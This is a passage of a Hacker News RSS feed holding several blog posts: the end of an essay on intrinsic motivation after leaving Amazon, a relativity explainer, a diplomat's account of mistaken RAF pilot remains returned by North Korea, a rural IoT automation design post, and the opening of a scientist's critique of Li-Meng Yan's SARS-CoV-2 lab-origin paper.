<figure><img loading="lazy" width="1024" height="576" src="https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=1024%2C576&amp;ssl=1" alt="Rewards up, motivation down." srcset="https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?resize=1100%2C619&amp;ssl=1 1100w, https://i0.wp.com/danielvassallo.com/wp-content/uploads/2019/02/rewards_motivation-2340812862-1549830899929.png?w=1801&amp;ssl=1 1801w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>Rewards up, motivation down.</figcaption></figure>



<p>It would have been foolish of me to expect my motivation to start increasing if I got yet another promotion, or another compensation bump, or another big project. But there was something else that was trending down with my motivation. It was my freedom.</p>



<h3>The Motivation Decline</h3>



<p>For the first couple of years my motivation was off the charts. I was mostly working with another person on an internal tool, and there was very little scrutiny around it. It was a time where I had a lot of independence in choosing how to work and what to work on—at least relative to more recent years.  It was just me and the other person improving this thing, talking to users, releasing updates, testing it, and everything else. Whatever we felt was important, we generally got to do. We did the best work we could for its own sake and we were mostly self-directed.</p>



<p>The last couple of years, however, were quite different. I was leading the most important project in the history of my department, with many stakeholders and complex goals. What I could do was always bounded by my ability to convince all the people involved that it was the best way to navigate our goals. </p>



<p>I was always going to be working on somebody else’s terms at Amazon. The terms were simple in the beginning (keep fixing the thing), but kept getting more complicated as the years passed by (maximize all goals; satisfy all stakeholders). Then there were other restrictions inherent to working in a large organization about how to do the work, what work to do, what goals to set, and what business was worth pursuing. This situation was squeezing me into doing things that I’d rather not do, and vice versa.</p>



<h3 id="mce_19">Finding New Motivation</h3>



<p>What kind of work would I do if I had to do it forever? Not something that I did until I reached some milestone (an exit), but something that I would consider satisfactory if I continued to do it until I’m 80. What is out there that I could do that would make me excited waking up every day for the next 45 years that could also earn me enough money to cover my expenses? Is that too unambitious? I don’t think so. Because there are two types of drivers that get me out of bed in the morning.</p>



<p>One comes from the outside in the form of a carrot or a stick. For instance, I’m not automatically driven to do my tax returns every April, but I make sure I do because I don’t want to go to prison. Or I might not want to work on something I dislike, but I do so anyway because I may need to pay the bills, or want to buy a fancy car. These are the extrinsic motivators.</p>



<p>The other comes from within. This is what drives me to do things when there isn’t a carrot or a stick. Hobbies are one activity driven by this. But what I was looking for was something that I could do for a living that was also driven by this type of motivation: the intrinsic kind.</p>



<p>Back to the question of whether this is too unambitious. See, I realized that extrinsic motivation doesn’t last. Whenever I got promoted, it felt good for a week, and then it was as over. When I first hit $100K income, I would take a peek at my W2 for a few days admiring the six digits, but then it wore off. When I hit $200K, $300K, $400K, and $500K, it was the same thing. I would be delusional to think that earning $1M, or $10M would suddenly make it different. And I feel the same with every other extrinsic reward or material possession. Getting them feels good for a while, but this wears off quickly.</p>



<p>The things that don’t wear off are those that I’ve been doing since I was a kid, when nothing was forcing me to do them. Things such as writing code, selling my creations, charting my own path, calling it like I saw it. I know my strengths, and I know what motivates me, so why not do this all the time? I’m lucky to live in a time where I can do something independently in my area of expertise without requiring large amounts of capital or outside investors. So that’s what I’m doing.</p>



<h3>What’s Next?</h3>



<p>I’m going all in on independence, and I’m going to try to make a living with my own bare hands starting from nothing. I don’t expect to only do things that I like, but it will be on my terms. My target is to cover my family’s expenses before I run out of savings while doing something that intrinsically motivates me. What more would I ever want to be satisfied with my work?</p>



<p>If you liked this article, check out:</p>



<ul><li><a href="https://danielvassallo.com/from-employee-to-bootstrapper/">How I set myself up financially before I took the plunge</a>.</li><li><a rel="noreferrer noopener" aria-label="And obviously about what I’ll be doing for a living (opens in a new tab)" href="http://danielvassallo.com/#doing" target="_blank">And what I’m doing now for a living</a>.</li></ul>



<p>Now that I can use Twitter without being subject to Amazon’s social media policy, you can <a href="https://twitter.com/dvassallo">follow me there</a> as I continue to document my journey.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://danielvassallo.com/only-intrinsic-motivation-lasts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529590</guid>
            <pubDate>Sat, 19 Sep 2020 18:44:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is relativity, anyway?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529573">thread link</a>) | @frisco
<br/>
September 19, 2020 | https://maxhodak.com/nonfiction/2020/09/18/relativity.html | <a href="https://web.archive.org/web/*/https://maxhodak.com/nonfiction/2020/09/18/relativity.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
  <p>Relativity is one of my favorite topics in physics. Its origins were almost pure <a href="https://en.wikipedia.org/wiki/Einstein's_thought_experiments">logic puzzle science</a>, which in my opinion is one of the most fun and satisfying types of science. Most people have a vague sense of what relativity is – the speed of light is finite, and something about time travel? – but they don’t really know what it is, which is too bad because the principles are very simple, and the results are pretty awesome.</p>

<p>There are two halves of relativity as Einstein developed it: special relativity and general relativity.</p>

<p>Special relativity is, at heart, two ideas:</p>
<ul>
  <li>The laws of physics are the same to everyone everywhere, as long as they are using a non-accelerating (“inertial”) frame of reference.</li>
  <li>The speed of light in a vacuum is the same regardless of frame of reference.</li>
</ul>

<p>Before Einstein, these two things were widely considered to be paradoxical: how could it be that the speed of light is constant for everyone – its velocity is not added to your velocity, if you are moving – but also physics doesn’t depend on your perspective? What Einstein did was take both of these things seriously and realized that when you put them together, you get a space-time connection and lot of other really powerful stuff.</p>

<p>For example, <a href="https://en.wikipedia.org/wiki/Time_dilation">time dilation</a> immediately falls out. Imagine that you are standing on the platform of a train station while a train flies past, and your friend is onboard the train. If your friend puts a mirror on the ceiling of the train car and, lying on the floor, points a flashlight at it, he will see the light reflected back at him having gone up in a straight line and returned in a straight line to the floor. However, from your perspective on the platform, while the light is traveling up and down, it is also traveling sideways. This means the path it travels is <em>longer</em> than the path it appears to travel to your friend. Since the speed of light is constant, and the distance between the floor and the ceiling don’t change, from your perspective, time must be passing more slowly for your friend than for you. And indeed this is an experimentally tested real effect! (For example, you need to take it into account for GPS to work reliably.) It is important to note that your friend, on the train, never feels anything different: from their perspective, time is passing just fine at the same rate it always does. The effect is entirely about the difference in your perspectives.</p>

<p>The idea that the laws of physics are the same of everyone is sometimes called “general covariance” and is really important for the tractability of a description of physics overall. There isn’t necessarily a guarantee that it would be true in our universe, but it turns out that it is.</p>

<p>General relativity adds one more idea: when an observer is using an accelerating (“non-inertial”) frame of reference, the laws of physics might appear to be different, and that difference shows up as a gravitational field.</p>

<p>For example, if you are in a car accelerating on the highway and you throw a ball into the air, it will veer towards the back of the car. You know that this is because the car is accelerating - but it is also completely equivalent to model this as a gravitational field coming from the back of a non-accelerating car! In fact, the equivalence principle says that if you were in a windowless box that was either being accelerated by a rope or is in the presence of a gravitational field, there is no measurement you could make that would tell them apart.</p>

<p>The language of physics is math, and so while it’s easy to get the big ideas that underlie relativity, getting the full depth of the implications requires going to the equations. The math of special relativity is mostly pretty easy – you can get surprisingly far with high school level math – but general relativity is a completely different beast, and one of the reasons Einstein’s original GR papers are so challenging is because the math really required to do it well (e.g. differential geometry) didn’t exist at the time. Einstein had the realization that the universe has no sense of coordinates, just a way of measuring distances between events, which he described as “no prior geometry,” but it took a while for the full mathematical description of what this actually meant to be worked out.</p>

<p>Anyway, relativity is incredibly trippy and fascinating, so if you’ve liked this sneak peek I highly recommend checking out Einstein’s short 1916 book <a href="https://en.wikipedia.org/wiki/Relativity:_The_Special_and_the_General_Theory">“Relativity: The Special and the General Theory”</a> which is written for laypeople and uses very little math while still walking you through the core of it all with Einstein’s unique incisive clarity. General relativity is certainly one of the most beautiful things in all of science (possibly <em>the</em> most; quantum field theory is very cool too, though it lacks the intrinsic elegance of GR), and I wish more people had the chance to understand and appreciate it.</p>

</div></div>]]>
            </description>
            <link>https://maxhodak.com/nonfiction/2020/09/18/relativity.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529573</guid>
            <pubDate>Sat, 19 Sep 2020 18:42:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cruel Deception – RAF Pilot Remains Discovered in North Korea]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529345">thread link</a>) | @Hansig_jw
<br/>
September 19, 2020 | https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/ | <a href="https://web.archive.org/web/*/https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><strong>A cruel</strong> <strong>deception</strong> – <strong>RAF pilot</strong> <strong>remains</strong> discovered in <strong>North Korea</strong> is a story that once I had the full details of the aftermath several years later, quite frankly left me speechless and angry.</p><p>In early 2004, I was contacted at the embassy in Pyongyang by David Hinton, the brother of an RAF pilot who had been shot down in 1952 over North Korea during the Korean war. He said he had been working for several years trying to garner as much information from a variety of primary sources as to the fate of his brother.Â&nbsp; He said he now had in his possession most of the details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he later sent to me).</p><p>He then expressed a wish to be able to visit North Korea and hopefully, finally discover the fate of his brother. Could we help?</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><div id="gallery-1"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/thumbnail-1/#main"><img width="400" height="311" src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" alt="Flt Lt Hinton North Korea" aria-describedby="gallery-1-980" data-lazy-srcset="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?w=400&amp;ssl=1 400w, https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?resize=300%2C233&amp;ssl=1 300w" data-lazy-sizes="(max-width: 400px) 100vw, 400px" data-lazy-src="https://i0.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/thumbnail-1-1.jpg?fit=400%2C311&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-1-980"> Flt Lt Hinton with USAF colleagues -Photo David Hinton</figcaption></figure></div><p>I knew that this was going to be a tall order to try and carry out. The Korean War itself was and still is a huge propaganda tool for the Kim dynasty. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><p>But surprisingly, no.</p><p>Permission was granted for me to meet with the North Korean military and at the initial meeting, I provided them with all the research material sent to me by David Hinton and they said they would investigate.</p><p><em><strong>The</strong><strong> process of making this project happen, working with the North Korean military, I have covered in a previous post</strong></em> <a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/">British Diplomat Works With North Korean Military </a></p><p>Against all expectations, the military did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. An exact location had been identified and human bones and fragments of uniform and aircraft had been uncovered. <em><strong>This scenario is somewhat similar to my previous post</strong> </em><a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p>With this discovery, events moved quickly. A visa for David to enter North Korea was fast tracked and he duly arrived hopeful for some form of final closure. During his visit, he was treated as an honoured guest by the North Koreans and enjoyed the rare distinction of being accompanied throughout his visit by a senior Korean People’s Army officer, Colonel Kwak Chol-hui, who was at that time Director of Negotiations for Remains at the armistice site at Panmunjom.</p><p>So, on the day appointed to visit the village to view the grave, we arrived early and were met by the Colonel and both witnesses who then led us to the gravesite which was a short distance away.</p><p>The grave consisted simply of a mound of earth surrounded by a white picket fence, without any inscription. It lay close to a narrow footpath on a hillside 200 meters from the road.</p><p>David was introduced at the grave to the two witnesses to Desmond’s crash, a Mr Ri and Mr Han, local villagers who were only 13-years old at the time of the incident but who still appeared to have perfect recollections of the event. Perhaps a little too perfect and too detailed I thought at the time. But, maybe it was just me being a tad too cynical.</p><p>David then gave a short speech at the grave, thanking Colonel Kwak and the British embassy for making his visit possible, while the head of the village promised to tend the grave and paint the fence regularly.</p><p>We spent about 2 hours in the village and at the gravesite before it was time to leave. We said farewell to the Colonel and the witnesses and set off back to Pyongyang and David left North Korea the next day.</p><p>Upon his return to the UK, he was kind enough to send me copies of the many photographs he had taken that day and which I still have.</p><p>I learnt later that in 2011, a casket containing the bones of Flt Lt Hinton had been passed with great ceremony to the then British ambassador to North Korea for repatriation and presumably for burial at the UN Korean War cemetery in Busan, South Korea.</p><p><strong>And here the story would have finally ended. But no!</strong></p><p>The British Daily Mail ran a story on 17th June 2018 that was a shocker to me. It was revealed that subsequent DNA testing carried out on the bones after the repatriation identified them not as those of Flt Lieutenant Hinton but those of an animal!</p><p>According to the paper, family members were informed but the media was kept in the dark for fear of damaging relations between North Korea and the UK. Don’t you just love political machinations!</p><p>The paper then went on to quote the source as the memoirs of Mr Thae Yong-Ho, a North Korean diplomat who was Deputy North Korean Ambassador to the UK at the time and who defected to South Korea in 2016.</p><p>It also came as North Korean dictator Kim Jong Un had agreed with US President Donald Trump at their Singapore summit that all remains of US servicemen who died in the Korean War would now be returned.</p><p>Interestingly, the New York Times ran a story on 1st August 2018 detailing how difficult it had been to identify remains of American MIA’s handed over by the North Koreans to the US as a result of the Agreement with the paper also quoting the Hinton DNA story.</p><p>Mr Thae maintained that the Hinton episode was a case of crass incompetence. He also stated that Britain did protest but North Korean officials countered by saying they lacked the proper equipment to distinguish human from animal bones.</p><p>To this day, I cannot believe how stupid the North Koreans behaved in this matter. They must have known that DNA would be carried out on the bones.Â&nbsp; If so, why did they release them?</p><p>A country that has a nuclear programme, the ability to launch missiles and a sophisticated scientific infrastructure coming out with such a lame excuse just didn’t hold water.</p><p>I might add that at the time of the Hinton project, Mr Thae was well known to the embassy in Pyongyang, both professionally and socially. He was an experienced diplomat at the Ministry of Foreign Affairs where as part of his portfolio, he was in charge of the UK desk, hence the contacts. So, he would have been well aware (and probably involved behind the scenes) in what developed.</p><p>So what should have been a positive North Korean story about the discovery and dignified burial of a fallen RAF pilot and the assistance given to a close relative to enable him to pay his last respects, in the end turned out to be nothing but a cruel and wicked deception.</p><p><em><strong>Sources:</strong></em></p><p>https://www.dailymail.co.uk/news/article-5852503/Remains-RAF-hero-shot-North-Korea-2011-turns-animal-bones.html</p><p>“Cryptography From the Third-<wbr>Floor Secretariatâ€� 2018 Thae Yong-Ho</p><div heateor-sss-data-href="https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/"><p>Spread the love</p><ul><li><a data-pin-lang="en_US" href="https://www.pinterest.com/pin/create/button/?url=https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/" data-pin-count="false" data-pin-do="buttonPin" data-pin-config="beside"><img src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845" data-recalc-dims="1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://i2.wp.com/assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png?w=845"></a></li></ul></div></div></div>]]>
            </description>
            <link>https://www.mydiplomaticlife.com/a-cruel-deception-raf-pilots-remains-discovered-in-north-korea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529345</guid>
            <pubDate>Sat, 19 Sep 2020 18:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Maker Tech on the Land]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529300">thread link</a>) | @joshka
<br/>
September 19, 2020 | https://tatham.blog/2020/08/22/maker-tech-on-the-land/ | <a href="https://web.archive.org/web/*/https://tatham.blog/2020/08/22/maker-tech-on-the-land/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I live in an inner-city apartment. There’s a concrete slab, brick walls, and no ceiling cavity access. Oh, and we rent, so drilling into things is frowned upon. The home automation potential in a scenario like this consists of some coloured lights, and watering about four plants on a timer. It’s not exactly an inspiring IoT site. There’s also not much wrong with the humble light switch that works instantly, every time.</p>



<p>In complete contrast to this, my parents live on 100 acres / 40 hectares of land, a few hours out of the city. It’s quintessential rural Australia. They’re mostly off the grid: there’s a skerrick of Telstra 4G signal, and some power, except when there isn’t, which is surprisingly often. This is an absolute IoT playground, and we’ve given that a fair crack over the seven years as they’ve established themselves there.</p>



<h2>Opportunity</h2>



<p>On a property like this, water is critical. There are the basic living requirements, the opportunity of gardens, and the very real risk of bushfires. All up, we have ~300,000 litres of water tanks on the property, and then a small dam and two creeks. We use sensors to track tank volumes. We measure flow rates at key plumbing points (for both instantaneous oversight and tracking cumulative usage). We use power meters to detect when pressure pumps are running.</p>



<p>Energy management is also important. Whilst there is the option of grid connectivity, we try to run as off-grid as possible, or at least export-only. This requires some smarts around load management. For example, instead of just having a hot water system that aggressively chases a specific temperature, we want the hot water systems to head for a temperature range, but only use excess solar production to do it. If there’s a bit less sun for the day, it’s ok if the water it a few degrees cooler: don’t burn down the batteries or import power just to hit a specific temperature.</p>



<p>And then there’s a safety aspect. The property is on the top of an escarpment where storms can roll in fast from a few different directions. By running things like lightning sensors on the property, we can trigger our own localised alerts for approaching storms.</p>



<h2>Challenges</h2>



<p>The challenge is to convert all these possibilities into something real, that works, and doesn’t cost an absolute mint. Over the years, we found this incredibly hard to solve for. You’ll find a solution for measuring tank volume, but it comes with its own LoRA gateway, a cloud dependency, and a new app. You’ll find a cheap Z-Wave temperature sensor, but it’s only really good for a room, and doesn’t have a probe that you can put into the measurement point in a hot water system. You’ll find a flow meter, but it’s only an industrial solution that wants to talk RS485 serial. Who even does that anymore⁈ You’ll find a garage door opener that works for the extra-high roller doors on the shed, but it has its own 433MHz RF remote.</p>



<p>It’s easy to end up with a horrible mishmash of radio technologies, software platforms, and APIs, not to mention some scary pricing as you drift from the traditional world of home automation into the more dated world of industrial automation.</p>



<h2>Goal</h2>



<p>We want to be able to dream up crazy new ideas, pick and choose the right sensors, and then integrate them with relative ease and consistency. That means a balance between the ability to build new things ourselves, but not having to go and custom fabricate a circuit board and write new firmware just to add a new sensor.</p>



<h2>Considerations</h2>



<h3>Sense</h3>



<p>Most sensors give out some kind of analogue signal (like a pressure sensor where the output voltage varies from 0V to 5V depending on applied pressure), a pulse (like a flow meter that pulses once for every 500mL of water that flows through it), or a digital signal (like a temperate and humidity sensor with a <a href="https://en.wikipedia.org/wiki/1-Wire">1-Wire</a> output).</p>



<p>To handle all of these scenarios, we’ll need some <a href="https://en.wikipedia.org/wiki/GPIO">GPIO pins</a> (the most basic of digital connections), and something with an analogue-to-digital-converter onboard (so that we can measure that variable pressure scenario).</p>



<h3>Affect</h3>



<p>Most of the outputs that we’re dealing with are straight up binary: turn a pump on, open a valve, flash a light. This means that they can be again driven by some GPIO pins, paired with an appropriately sized relay.</p>



<p>For more complex outputs, like sound, we can defer back to more consumer-grade hardware, like just broadcasting an announcement on the Google Home speaker in the kitchen.</p>



<h3>Plug and Play</h3>



<p>As much as we’re building things ourselves, we don’t need to put too many barriers in front of ourselves. We’re after a module that we can connect sensors to easily, without too much soldering, and certainly not having to build up our own circuit boards / <a href="https://en.wikipedia.org/wiki/Veroboard">Veroboard</a>. We want to be out of the lab and into the environment as fast as possible.</p>



<h3>Secure</h3>



<p>There’s a persistent joke about how the ‘S’ in IoT stands for security.</p>



<p>Security was absolutely a consideration for us though: both on-property, and when it comes to remote access. When you’re switching things like power, or controlling a precious resource like water, you want to be confident that you’re the only person in control.</p>



<p>Our preference has been to keep connectivity and control local to the property, via authenticated connections, and then apply a separate remote access approach further up the stack. This means the hardware needs to have enough power and smarts to handle secured local connections, and not be dependent on its own path to the internet.</p>



<h3>Compute</h3>



<p>Some sensors require both precise timing and persistence to count things like pulses and turn them into natural measures. For example, a flow meter might give you a signal pulse for very 500mL of water that flows through it. If you miss a pulse and stop counting for a bit, you’re missing water. Our preference has been to count pulses on the hardware attached to the sensor, and then report back the natural values (L/min, L/day) whenever the network and central compute is available. We want to keep sensor-specific concepts, like pulses, at the sensor, and just send meaningful information over the network.</p>



<p>As much as we want things to be connected, they can still be somewhat smart in their own right. If a hardware module has both a temperature sensor and a relay to turn a heating element on and off, it’s perfectly capable of being a thermostat on its own, regardless of what’s happening to the wider network or any centralised compute. It will be <em>smarter</em> when the central controls are online, because it can be aware of other datapoints like the solar charge status, but it doesn’t have to be totally bound to the availability of those other systems to operate its basic function. Achieving this balance requires us to be able to run basic logic directly on the module.</p>



<p>The world is not static. If we want to run logic on these devices, and keep them secure, they need to be able to receive firmware updates over-the-air. We don’t want to be clambering around under sheds with laptops to reprogram a thermostat.</p>



<h3>Connect</h3>



<p>Network standards are still the multi-billion-dollar question in IoT.</p>



<p>Early on, we deployed a number of <a href="https://en.wikipedia.org/wiki/Z-Wave">Z-Wave</a> and <a href="https://en.wikipedia.org/wiki/Zigbee">Zigbee</a> based devices. These are two different mesh protocols, at the mid-point of their VHS vs. Betamax battle for dominance. They’re common in consumer automation solutions like smart switches, and good for extremely low power environments, like where you want to be able to throw a temperature sensor in the corner of a room with a coin-cell battery in it and then forget about it for a year. The sensor ecosystem is very consumer focussed (you’ll find a million temperate sensors, but no tank pressure sensors). The communication protocol is constrained: by design, it’s a very low bandwidth data network, operating up to 40kbps for Z-Wave, or a whopping 250kbps for Zigbee. Range is limited to keep within the power limits, so typically as low as ~15-20m. There’s no common way of building on-device logic, and if you do manage to, then it’s incredibly hard to apply firmware updates over-the-air for either of them.</p>



<p>Our exploration continued into LoRA and NB-IoT, but we’ve opted away from both for this property. They’d each be very compelling options if we wanted to cover the larger property, such as if it was more of a working farm with distributed infrastructure than predominantly bushland and gardens with clustered buildings.</p>



<p>Ultimately, we settled on Wi-Fi as our preferred connectivity on the property. We’re already got great coverage throughout the house, cottage, shed, and key outdoor locations via <a href="https://unifi-network.ui.com/">a UniFi deployment</a>. Whilst this is heavily centred on the built infrastructure, and not the full 100 acres of property, that’s where most of the sense-and-act needs to occur anyway. Investing in the Wi-Fi coverage provides other benefits, like <a href="https://www.telstra.com.au/support/mobiles-devices/telstra-wifi-calling">Wi-Fi calling</a> for mobiles where we’re otherwise on the fringe of 4G coverage. The UniFi infrastructure is readily extensible, as <a href="https://larsklint.com/updating-farm-wi-fi-with-ubiquiti-unify/">Lars has proven on his property</a> with the deployment of <a href="https://llamacam.com.au/">Llama Cam</a>, and even <a href="https://larsklint.com/farm-wifi-off-the-grid-with-ubiquiti-solar/">extending the coverage to places without power</a>. Finally, it gives us a pretty amazing management plane that’s a lot nicer to work with than trying to diagnose a Z-Wave/Zigbee mesh.</p>



<figure><img data-attachment-id="1173" data-permalink="https://tatham.blog/uni-fi-infrastructure-topology/" data-orig-file="https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png" data-orig-size="2248,1407" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="uni-fi-infrastructure-topology" data-image-description="" data-medium-file="https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=300" data-large-file="https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=1024" src="https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=1024" alt="Topology diagram of UniFi network showing switches and access points" srcset="https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=1024 1024w, https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=2048 2048w, https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=150 150w, https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=300 300w, https://tatham.files.wordpress.com/2020/08/uni-fi-infrastructure-topology.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>UniFi infrastructure topology</figcaption></figure>



<h3>Power</h3>



<p>We’re happy to depend on a power source for most devices: they’re usually located near other loads that are already powered, or it’s easy enough to get power to them, such as dropping in a 12V cable out to a water tank at the same time as trenching the plumbing in. If we really want to run on battery, it’ll be ok to have a larger 12v battery and a small solar panel or something: we don’t need to try and run off a coin-cell battery for years on end.</p>



<h3>Cost</h3>



<p>The approach needs to be reasonably affordable if it’s going to grow over time: tens of dollars to add a new thing, not hundreds.</p>



<p>Sensors themselves range from <a href="https://www.aliexpress.com/wholesale?SearchText=DS18B20+cable">$1 for a temperature probe</a>, to <a href="https://www.aliexpress.com/wholesale?SearchText=as3935">$20 for a lightning sensor</a>,…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tatham.blog/2020/08/22/maker-tech-on-the-land/">https://tatham.blog/2020/08/22/maker-tech-on-the-land/</a></em></p>]]>
            </description>
            <link>https://tatham.blog/2020/08/22/maker-tech-on-the-land/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529300</guid>
            <pubDate>Sat, 19 Sep 2020 18:02:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Discussion of Li-Meng Yan's Paper on SARS-CoV-2]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24529261">thread link</a>) | @akvadrako
<br/>
September 19, 2020 | https://www.randombio.com/ratg132.html | <a href="https://web.archive.org/web/*/https://www.randombio.com/ratg132.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- change font to prevent FauI coming out as Faul -->
<section>

<p>
<span> <img src="https://www.randombio.com/O40gray-gray.png" alt="O" title="O"></span>
n September 14 2020, Li-Meng Yan, a dissident Chinese virologist, along with three
colleagues, posted an article at <a href="https://zenodo.org/record/4028830">zenodo.org</a>
<sup>[1]</sup> claiming to prove that SARS-CoV-2 was artificially created. Twitter 
canceled the author's account two days later and political activists vociferously 
attacked the paper on political grounds. It is clear that many people don't want to 
hear her evidence. But the issue is extremely important. If the virus was produced 
in an experiment and accidentally released, as this paper claims, it means the Wuhan 
Institute of Virology is in dire need of upgrades to their virus-handling procedures 
to prevent it from happening again.
</p><p>
My background is 30 years as a researcher in protein biochemistry using biophysical 
techniques and molecular biology, including design, cloning, and expression of 
recombinant proteins, to study protein function and structure. Here's a brief
summary of the argument put forward in the paper along with my comments.
</p><p>
<i>Update, Sep 20 2020</i>: I've expanded the comments to describe the evidence they
would need to make their case more convincing.
</p><hr><p>
<b>Claim 1:</b> 
   “[the sequences of] RaTG13, RmYN02, and several pangolin viruses recently
   published are highly suspicious and likely fraudulent.”
   “The RaTG13 virus is excluded from this analysis given the strong evidence 
   suggesting that its sequence may have been fabricated and the virus does not exist 
   in nature.”
</p><p>
<b>Comment:</b>
   RaTG13 was published by Shi Zhengli at the same time as the SARS-CoV-2 sequence. 
   In 2013 Shi also published a partial gene segment of RaBtCoV/4991, which is identical 
   to RaTG13, but it is incomplete. The authors say that the WIV took this partial
   sequence and fraudulently added the remainder to exculpate themselves, trying
   to make it appear that RaTG13 was a pre-existing virus. 
</p><p>
   Evidence in favor of this claim is that Shi <i>et al.</i> made no mention of 
   RaBtCoV/4991 in their 2020 paper. But unless someone wants to claim that 4991 
   was also fabricated, RaBtCoV/4991 had to come from somewhere, which is to say it is 
   a real virus. So Claim 1 doesn't make sense. 
</p><p>
<b>What is needed:</b>
   To prove this the authors would have to find another virus that is 100% identical 
   with the published partial RaBtCoV/4991 sequence but which differs from RaTG13. 
</p><hr><p>

<b>Claim 2:</b> 
   The WIV could have used transgenic hACE2 transgenic mice to improve the virus's
   ability to bind to its receptor. “This animal model 
   has been established during the study of SARS-CoV and has been available in the 
   Jackson Laboratory [a commercial supplier of transgenic mice] for many years.”
   However, hACE2 mice are “not a good model to reflect the virus' transmissibility
   and associated clinical symptoms in humans.” If they had used golden Syrian
   hamster instead, the authors say, “the highly contagious nature of SARS-CoV-2 
